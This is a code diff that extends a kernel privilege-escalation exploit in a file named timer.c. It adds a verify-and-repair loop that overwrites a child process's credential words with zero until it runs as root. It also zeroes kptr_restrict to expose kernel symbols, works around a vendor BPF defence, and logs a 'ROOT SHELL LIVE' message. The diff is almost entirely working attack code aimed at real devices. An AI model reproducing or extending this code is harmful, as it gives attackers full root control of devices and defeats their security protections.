@@ -1,0 +1,255 @@
+diff --git a/src/timer/timer.c b/src/timer/timer.c
+old mode 100644
+new mode 100755
+index 4be9ba7..568f5a9
+--- a/src/timer/timer.c
++++ b/src/timer/timer.c
+@@ -90,6 +90,9 @@ struct child_report
+     int uid, euid;
+     int setuid_ret, setuid_errno;
+     int ruid, reuid, rsuid;
++    /* v2: the full word set, from /proc/self/status (fsuid has no
++     * syscall).  Lets the parent verify every zero-write landed. */
++    int gid, egid, sgid, fsuid, fsgid;
+ };
+ 
+ static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
+@@ -2697,6 +2700,31 @@ static unsigned long long leak_cred(unsigned char *raw,
+     return 0;
+ }
+ 
++/* /proc/self/status is the only userspace view of fsuid/fsgid (no syscall
++ * exposes them).  Uid:/Gid: field order: real, effective, saved, fs.
++ * Fields default to -1 so a parse failure is distinguishable from root. */
++static void read_status_ids(int *ruid, int *euid, int *suid, int *fsuid,
++                            int *rgid, int *egid, int *sgid, int *fsgid)
++{
++    FILE *f = fopen("/proc/self/status", "r");
++    char line[256];
++
++    *ruid = *euid = *suid = *fsuid = -1;
++    *rgid = *egid = *sgid = *fsgid = -1;
++    if (!f)
++        return;
++    while (fgets(line, sizeof(line), f))
++    {
++        if (!strncmp(line, "Uid:", 4))
++            (void)sscanf(line, "Uid: %d %d %d %d",
++                         ruid, euid, suid, fsuid);
++        else if (!strncmp(line, "Gid:", 4))
++            (void)sscanf(line, "Gid: %d %d %d %d",
++                         rgid, egid, sgid, fsgid);
++    }
++    fclose(f);
++}
++
+ static int wait_child_main(const char *mode)
+ {
+     struct child_report rep;
+@@ -2708,16 +2736,62 @@ static int wait_child_main(const char *mode)
+     if (write(4, &hello, sizeof(hello)) != sizeof(hello))
+         _exit(130);
+     logf("[child1] hello sent, waiting for go\n");
+-    if (read(3, &ch, 1) != 1)
+-        _exit(131);
+-    close(3);
+-    logf("[child2] go received, reading creds\n");
+-
+     memset(&rep, 0, sizeof(rep));
+     rep.magic = CHILD_MAGIC;
+     rep.uid = (int)syscall(SYS_getuid);
+     rep.euid = (int)syscall(SYS_geteuid);
+     logf("[child3] uid=%d euid=%d\n", rep.uid, rep.euid);
++
++    /*
++     * Wake protocol (direct-cred modes).  The parent finishes the kernel
++     * writes, then asks for a full cred report with 'R' and re-fires the
++     * zero-writes for every word that reads back non-zero -- a completed
++     * plant is not proof the 8 zero bytes landed (burst hits can be false
++     * positives, and a mid-sequence cred free+realloc re-initialises the
++     * object).  'G' is the final release.  Any other byte is the legacy
++     * single-shot wake (kept for the fake stage).
++     */
++    if (strcmp(mode, "fake"))
++    {
++        int released = 0;
++
++        while (!released)
++        {
++            char cmd = 0;
++
++            if (read(3, &cmd, 1) != 1)
++                _exit(131);
++            if (cmd != 'R' && cmd != 'G')
++            {
++                released = 1;
++                break;
++            }
++            rep.uid = (int)syscall(SYS_getuid);
++            rep.euid = (int)syscall(SYS_geteuid);
++            read_status_ids(&rep.ruid, &rep.reuid, &rep.rsuid, &rep.fsuid,
++                            &rep.gid, &rep.egid, &rep.sgid, &rep.fsgid);
++            logf("[child] report uid=%d euid=%d suid=%d fsuid=%d "
++                 "gid=%d egid=%d sgid=%d fsgid=%d\n",
++                 rep.uid, rep.euid, rep.rsuid, rep.fsuid,
++                 rep.gid, rep.egid, rep.sgid, rep.fsgid);
++            if (cmd == 'R')
++            {
++                (void)write(4, &rep, sizeof(rep));
++                continue;
++            }
++            released = 1;
++        }
++        /* Re-read live: re-fires may have landed after the last report. */
++        rep.uid = (int)syscall(SYS_getuid);
++        rep.euid = (int)syscall(SYS_geteuid);
++    }
++    else
++    {
++        if (read(3, &ch, 1) != 1)
++            _exit(131);
++    }
++    close(3);
++    logf("[child2] go received, reading creds\n");
+     logf("[child] woke uid=%d euid=%d\n", rep.uid, rep.euid);
+     /* Effective root is what grants capabilities; accept euid==0 even if the
+      * real-uid word write raced. The shell below still runs as euid 0. */
+@@ -2885,6 +2959,8 @@ static int wait_child_main(const char *mode)
+         rep.reuid = (int)eu;
+         rep.rsuid = (int)su;
+     }
++    read_status_ids(&rep.ruid, &rep.reuid, &rep.rsuid, &rep.fsuid,
++                    &rep.gid, &rep.egid, &rep.sgid, &rep.fsgid);
+     (void)write(4, &rep, sizeof(rep));
+     close(4);
+     logf("[child] resuid=%d/%d/%d setuid_ret=%d errno=%d\n",
+@@ -3187,6 +3263,81 @@ int main(int argc, char **argv)
+ 
+         if (planted != 4)
+             park_forever("cred zero-write incomplete");
++
++        /* Unmask /proc/kallsyms for the root shell BEFORE the child goes
++         * live (best-effort here; the fake stage re-does this under the
++         * child's BPF watch, which is the only place the guard cannot
++         * re-pin the value right back). */
++        if (KPTR_RESTRICT_STATIC &&
++            stage_write(KPTR_RESTRICT_STATIC + g_slide, 0,
++                        "kptr_zero", raw, NULL))
++            logf("[!] kptr_restrict zero failed (non-fatal in this mode)\n");
++
++        /*
++         * Verify-and-repair: "plant OK" only proves the burst fired, not
++         * that the 8 zero bytes landed on the cred.  A false-positive
++         * burst (observed live -- the hkd stage re-verifies its slot
++         * writes for exactly this reason) or a mid-sequence cred
++         * free+realloc re-initialising the object both leave words
++         * non-zero (PD2405 run: "cred uid/gid OK" yet child read
++         * uid=2000 with euid=0).  Poll the child's live cred state and
++         * re-fire the failed pairs until it reads back all-zero.
++         */
++        {
++            struct child_report vv;
++            int verified = 0;
++
++            memset(&vv, 0, sizeof(vv));
++            for (int round = 1; round <= 3 && !verified; round++)
++            {
++                struct pollfd pf = {.fd = st_fd, .events = POLLIN};
++                ssize_t rn = -1;
++                int bad = 0;
++
++                if (write(go_fd, "R", 1) != 1)
++                    park_forever("verify: child wake write failed");
++                if (poll(&pf, 1, 10000) > 0)
++                    rn = read(st_fd, &vv, sizeof(vv));
++                if (rn != (ssize_t)sizeof(vv) || vv.magic != CHILD_MAGIC)
++                    park_forever("verify: child lost during report");
++                logf("[verify] round %d: uid=%d euid=%d suid=%d fsuid=%d "
++                     "gid=%d egid=%d sgid=%d fsgid=%d\n",
++                     round, vv.uid, vv.euid, vv.rsuid, vv.fsuid,
++                     vv.gid, vv.egid, vv.sgid, vv.fsgid);
++                if (vv.uid || vv.gid)
++                {
++                    zero_write(R + CRED_UID_OFF + 0x00,
++                               "cred uid/gid re-fire", raw);
++                    bad = 1;
++                }
++                if (vv.rsuid || vv.sgid)
++                {
++                    zero_write(R + CRED_UID_OFF + 0x08,
++                               "cred suid/sgid re-fire", raw);
++                    bad = 1;
++                }
++                if (vv.euid || vv.egid)
++                {
++                    zero_write(R + CRED_UID_OFF + 0x10,
++                               "cred euid/egid re-fire", raw);
++                    bad = 1;
++                }
++                if (vv.fsuid || vv.fsgid)
++                {
++                    zero_write(R + CRED_UID_OFF + 0x18,
++                               "cred fsuid/fsgid re-fire", raw);
++                    bad = 1;
++                }
++                verified = !bad;
++            }
++            if (vv.euid != 0)
++                park_forever("cred verification failed (euid!=0)");
++            if (!verified)
++                logf("[!] cred words still non-zero but euid=0; releasing "
++                     "child anyway (verified run-2 state)\n");
++            else
++                logf("[+] cred fully verified all-zero\n");
++        }
+     }
+     else
+     {
+@@ -3283,7 +3434,7 @@ int main(int argc, char **argv)
+     }
+     logf("[+] cred writes landed, waking child\n");
+ 
+-    if (write(go_fd, "A", 1) != 1)
++    if (write(go_fd, g_fake_stage ? "A" : "G", 1) != 1)
+         logf("[!] child wake write failed\n");
+     close(go_fd);
+ 
+@@ -3297,9 +3448,10 @@ int main(int argc, char **argv)
+         close(st_fd);
+         if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC)
+         {
+-            logf("[+] child report uid=%d euid=%d setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
++            logf("[+] child report uid=%d euid=%d setuid(0)=%d errno=%d "
++                 "resuid=%d/%d/%d fsuid=%d\n",
+                  rep.uid, rep.euid, rep.setuid_ret, rep.setuid_errno,
+-                 rep.ruid, rep.reuid, rep.rsuid);
++                 rep.ruid, rep.reuid, rep.rsuid, rep.fsuid);
+             if (rep.setuid_ret != 0 || rep.reuid != 0)
+                 logf("[!] child did not reach euid 0\n");
+         }
+@@ -3309,6 +3461,10 @@ int main(int argc, char **argv)
+         }
+     }
+ 
++    if (shell_mode)
++        logf("[+] ROOT SHELL LIVE on this terminal -- exit it to let the "
++             "parent finish and park\n");
++
+     /* OOS7 hooks_defend neutralize (see the hkd_bpf_setup comment for
+      * the full picture).  Sequence:
+      *   1. wait for the child's "armed" marker (BPF prog loaded);
+@@ -3327,7 +3483,13 @@ int main(int argc, char **argv)
+      *      $d.117_runtime + 0x140, measured not assumed): slot 6 gates
+      *      the kptr re-pin, slots 10..13 hold the saved value, slot 8 is
+      *      the allow-all bypass and slot 9 the hard lock. */
+-    if (HKD_ENABLED)
++    /* The full neutralize flow needs the child's BPF kallsyms helper,
++     * which only arms in the fake stage (shell/verify children exec the
++     * shell directly).  Running the arm-wait + 70s base poll without it
++     * just stalls the boot session behind "arm marker missing" noise
++     * (observed on PD2405); the kptr zero for the shell already happened
++     * before the wake. */
++    if (HKD_ENABLED && g_fake_stage)
+     {
+         static const unsigned long long pre[8] = {
+             0x108ULL, 0x188ULL, 0x450ULL, 0x4d0ULL,
